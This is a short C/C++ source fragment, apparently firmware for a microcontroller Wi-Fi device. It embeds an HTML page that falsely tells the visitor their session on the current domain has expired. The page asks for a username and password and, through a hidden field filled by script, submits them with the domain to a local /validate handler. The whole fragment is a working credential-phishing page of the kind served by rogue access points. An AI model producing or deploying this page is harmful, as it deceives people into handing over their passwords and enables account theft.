const char SITE2_HTML[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<body bgcolor="blue" text="white">
<center><h1>
Session at 
<script>
document.write(document.domain);
</script>
 Expired<br><br>Please login again.</h1></center><center>
</p><form method="get" action="/validate"><label>USERNAME: </label><input type="text" name="user" length=64><br><label>PASSWORD: </label><input type="password" name="pass" length=64><input type="hidden" id="isURL" name="url" value="" /><br><br><input style="color:black;background-color:white" value="Log-In" type="submit"></form>
<script>
document.getElementById("isURL").value=document.domain;
</script>
</center>
<body>
</html>
)=====";
